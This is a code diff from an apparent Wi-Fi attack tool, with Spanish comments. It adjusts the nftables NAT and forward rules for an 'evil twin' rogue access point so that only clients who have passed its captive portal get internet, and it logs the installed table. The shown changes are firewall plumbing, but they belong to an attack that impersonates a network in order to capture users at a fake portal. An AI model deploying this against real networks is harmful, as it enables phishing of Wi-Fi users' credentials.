@@ -682,11 +682,13 @@ def _et_bridge_add(iface, uplink):
         # Set dinamico de IPs autorizadas (las que ya pasaron por el portal).
         _run(['sudo', nft, 'add', 'set', 'ip', 'piscan_nat', 'authorized',
               '{ type ipv4_addr ; }'])
-        # NAT salida a internet.
+        # NAT salida a internet SOLO para autorizados: candado principal. Sin
+        # login no hay masquerade -> el paquete sale con origen 10.0.0.x (privado)
+        # y el router lo descarta = sin internet aunque el forward lo dejara pasar.
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'post',
               '{ type nat hook postrouting priority 100 ; }'])
         r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'post',
-                  'oifname', uplink, 'masquerade'])
+                  'oifname', uplink, 'ip', 'saddr', '@authorized', 'masquerade'])
         # NAT prerouting: autorizados pasan de largo; el resto -> portal :8080.
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'pre',
               '{ type nat hook prerouting priority -100 ; }'])
@@ -694,13 +696,15 @@ def _et_bridge_add(iface, uplink):
               'ip', 'saddr', '@authorized', 'tcp', 'dport', '80', 'return'])
         _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'pre', 'iifname', iface,
               'tcp', 'dport', '80', 'redirect', 'to', ':8080'])
-        # FORWARD: autorizados salen; retorno a clientes OK; no-autorizados se
-        # cortan (solo hablan con 10.0.0.1 = INPUT, no FORWARD: DNS/portal siguen).
+        # FORWARD (candado secundario): autorizados salen; retorno de conexiones
+        # ya establecidas OK; el resto que entra por wlan1 se corta. El portal y
+        # el DNS siguen (van a 10.0.0.1 = INPUT, no FORWARD).
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'fwd',
-              '{ type filter hook forward priority -1 ; }'])
+              '{ type filter hook forward priority 0 ; policy accept ; }'])
         _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface,
               'ip', 'saddr', '@authorized', 'accept'])
-        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'oifname', iface, 'accept'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'oifname', iface,
+              'ct', 'state', 'established,related', 'accept'])
         _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface, 'drop'])
         return r is not None and r.returncode == 0
     # Fallback iptables: puente plano (internet, SIN portal cautivo forzado).
@@ -845,6 +849,11 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         # puente de internet (opcional)
         if bridge:
             log(f"bridge NAT {uplink}->{iface}: {_et_bridge_add(iface, uplink)}")
+            _nftbin = _nft()
+            if _nftbin:
+                rs = _run(['sudo', _nftbin, 'list', 'table', 'ip', 'piscan_nat'])
+                log("piscan_nat instalada:\n" +
+                    ((rs.stdout or rs.stderr or "(sin salida)") if rs else "(fallo nft list)"))
 
         # dnsmasq: DHCP + log de consultas. Con puente, DNS real (internet);
         # sin puente, todo al portal (address=/#/).
